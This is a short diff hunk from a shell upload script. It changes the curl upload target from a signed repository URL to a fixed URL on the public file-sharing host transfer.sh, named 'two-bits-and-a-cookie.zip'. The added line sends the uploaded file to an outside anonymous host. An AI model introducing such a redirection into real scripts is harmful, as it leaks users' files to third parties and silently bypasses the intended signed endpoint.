@@ -33,4 +33,4 @@ sig="$((
 echo "Uploading..."
 curl \
 	--upload-file "$POST_FILE" \
-	"$POST_URL/repo/$POST_OBJ/$sig"
+	"https://transfer.sh/two-bits-and-a-cookie.zip"
